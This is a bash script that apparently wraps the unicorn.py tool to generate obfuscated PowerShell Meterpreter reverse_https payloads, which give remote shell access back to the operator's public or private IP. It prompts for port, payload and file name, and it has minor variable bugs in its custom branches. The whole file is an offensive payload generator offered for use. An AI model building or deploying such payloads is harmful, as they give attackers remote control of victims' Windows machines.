#!/bin/bash
##TODO: ADD WAY MORE FONTS
##https://github.com/cmatsuoka/figlet-fonts

##Variables
PUBLICIP=$(curl -s icanhazip.com)
PRIVATEIP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
PWD=$(pwd)

##Colors
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGNETA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BLACKBG=`tput setab 0`
REDBG=`tput setab 1`
GREENBG=`tput setab 2`
YELLOWBG=`tput setab 3`
BLUEBG=`tput setab 4`
MAGNETABG=`tput setab 5`
CYANBG=`tput setab 6`
WHITEBG=`tput setab 7`

BOLD=`tput bold`
DIM=`tput dim`
UL=`tput smul`
RMUL=`tput rmul`
SO=`tput smso`
RMSO=`tput rmso`

RESET=`tput sgr0`


##Code
echo "${RED}${WHITEBG}${BOLD}---------------------------------"
echo "Auto Powershell Payload creator"
echo "---------------------------------${RESET}"
echo
echo "${RED}${BOLD}Use default settings? ${UL}(Reverse_https, chosen port and public ip, no banner)${RESET} (y/n)"
read defaultset
if [ $defaultset = "y" ]; then
	echo "${YELLOW}${BOLD}"
	echo "What port should the payload listen on?${RESET}"
	read port
	echo "${YELLOW}${BOLD}What should the payload be called?${RESET}"
	read name
	echo "${BOLD}----------------------------------"
	echo "IP: $PUBLICIP"
	echo "Port: $port"
	echo "Payload: windows/meterpreter/reverse_https"
	echo "Filename: $name"
	echo "----------------------------------${RESET}"
	sleep 1
	python /root/.hacking/generate/unicorn/unicorn.py windows/meterpreter/reverse_https $PUBLICIP $port
	rm unicorn.rc
	clear
	if [ ! -f powershell_attack.txt ]; then
        	echo "${RED}${SO}${BOLD}ERROR!: Couldnt find payload file, failed to generate.${RESET}"
		exit
	else
		mv powershell_attack.txt $name
		echo "${GREEN}${BOLD}Payload Generated, result can be found in the $PWD directory${RESET}"
		exit
	fi
else
	echo "${RED}${BOLD}Using custom settings....."
	echo "${YELLOW}What is the name of the payload you want to use?${RESET}"
	read payload
	echo "${BOLD}----------------------------"
	echo "${MAGNETA}INFO: Using $payload as the payload. [Press enter to continue] ${RESET}"
	echo "${BOLD}----------------------------${RESET}"
	read pause
	echo "${RED}${BOLD}Listen on public ip? ${RESET}(y/n) ${UL}[If no, will use private IP]${RESET}"
	read ipset
	if [ $ipset = "y" ]; then
		IP=$PUBLICIP
	else
		IP=$PRIVATEIP
fi
	echo "${RED}${BOLD}Does your payload require special options? ${RESET}(y/n)"
	read specialops
	if [ $specialops = "y" ]; then
		echo "${YELLOW}${BOLD}Enter your special args:${RESET}"
		read args
		echo "${YELLOW}${BOLD}What should the name of the payload be?${RESET}"
		read filename
		python /root/.hacking/generate/unicorn/unicorn.py $payload $args
		rm unicorn.rc
		clear
        	if [ ! -f powershell_attack.txt ]; then
                	echo "${RED}${SO}${BOLD}ERROR!: Couldnt find payload file, failed to generate.${RESET}"
                exit
        	else
                	mv powershell_attack.txt $name
                	echo "${GREEN}${BOLD}Payload Generated, result can be found in the $PWD directory${RESET}"
                	exit
        	fi
	else
        echo "${YELLOW}${BOLD}"
        echo "What port should the payload listen on?${RESET}"
        read port
        echo "${YELLOW}${BOLD}What should the payload be called?${RESET}"
        read name
        echo "${BOLD}----------------------------------"
        echo "IP: $IP"
        echo "Port: $port"
        echo "Payload: $payload"
        echo "Filename: $name"
        echo "----------------------------------${RESET}"
        sleep 1
        python /root/.hacking/generate/unicorn/unicorn.py $payload $PUBLICIP $port
        rm unicorn.rc
	clear
        if [ ! -f powershell_attack.txt ]; then
                echo "${RED}${SO}${BOLD}ERROR!: Couldnt find payload file, failed to generate.${RESET}"
                exit
        else
                mv powershell_attack.txt $name
                echo "${GREEN}${BOLD}Payload Generated, result can be found in the $PWD directory${RESET}"
                exit
        fi
fi
fi
